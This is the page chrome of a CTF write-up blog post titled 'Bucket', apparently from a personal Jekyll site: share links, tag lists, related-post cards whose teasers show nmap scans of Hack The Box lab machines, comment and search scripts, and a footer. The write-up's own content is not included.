href="https://telegram.me/share?text=Bucket - Writeups&url=http://susanou.github.io/Writeups/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Writeups/posts/cycling/">Cycling</a><li><a href="/Writeups/posts/mlsteal/">MLSteal</a><li><a href="/Writeups/posts/pythia/">Pythia</a><li><a href="/Writeups/posts/ChunkNoris/">Chunk Norris</a><li><a href="/Writeups/posts/Admirer/">Admirer</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/Writeups/tags/crypto/">crypto</a> <a class="post-tag" href="/Writeups/tags/rsa/">RSA</a> <a class="post-tag" href="/Writeups/tags/easy/">easy</a> <a class="post-tag" href="/Writeups/tags/web/">web</a> <a class="post-tag" href="/Writeups/tags/aes/">AES</a> <a class="post-tag" href="/Writeups/tags/linux/">linux</a> <a class="post-tag" href="/Writeups/tags/misc/">misc</a> <a class="post-tag" href="/Writeups/tags/mitm/">MITM</a> <a class="post-tag" href="/Writeups/tags/sqli/">SQLi</a> <a class="post-tag" href="/Writeups/tags/crt/">CRT</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Writeups/posts/Magic/"><div class="card-body"> <span class="timeago small" > Aug 1, 2020 <i class="unloaded">2020-08-01T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Magic</h3><div class="text-muted small"><p> Reconnaissance &amp; Enumeration Let’s start by looking at what ports are open: nmap -sS -sC -sV -p- 10.10.10.185 [sudo] Mot de passe de fukurou : Starting Nmap 7.80 ( https://nmap.org ) at 2020...</p></div></div></a></div><div class="card"> <a href="/Writeups/posts/Admirer/"><div class="card-body"> <span class="timeago small" > Aug 1, 2020 <i class="unloaded">2020-08-01T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Admirer</h3><div class="text-muted small"><p> Reconnaissance &amp; Enumeration Let’s first start by looking at what ports are open on the machine: $ nmap -sS -sC -sV -p- 10.10.10.187 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 19:2...</p></div></div></a></div><div class="card"> <a href="/Writeups/posts/composition/"><div class="card-body"> <span class="timeago small" > Apr 7, 2021 <i class="unloaded">2021-04-07T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Composition</h3><div class="text-muted small"><p></p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Writeups/posts/lostkey/" class="btn btn-outline-primary" prompt="Older"><p>LostKey</p></a> <a href="/Writeups/posts/Heist/" class="btn btn-outline-primary" prompt="Newer"><p>Heist</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/Writeups/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//writeups-fukurou.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Bucket'; this.page.url = 'http://susanou.github.io/Writeups/posts/Bucket/'; this.page.identifier = '/posts/Bucket/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/Susanou">Cameron Hochberg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="Susanou" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/Writeups/tags/crypto/">crypto</a> <a class="post-tag" href="/Writeups/tags/rsa/">RSA</a> <a class="post-tag" href="/Writeups/tags/easy/">easy</a> <a class="post-tag" href="/Writeups/tags/web/">web</a> <a class="post-tag" href="/Writeups/tags/aes/">AES</a> <a class="post-tag" href="/Writeups/tags/linux/">linux</a> <a class="post-tag" href="/Writeups/tags/misc/">misc</a> <a class="post-tag" href="/Writeups/tags/mitm/">MITM</a> <a class="post-tag" href="/Writeups/tags/sqli/">SQLi</a> <a class="post-tag" href="/Writeups/tags/crt/">CRT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/Writeups/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://susanou.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
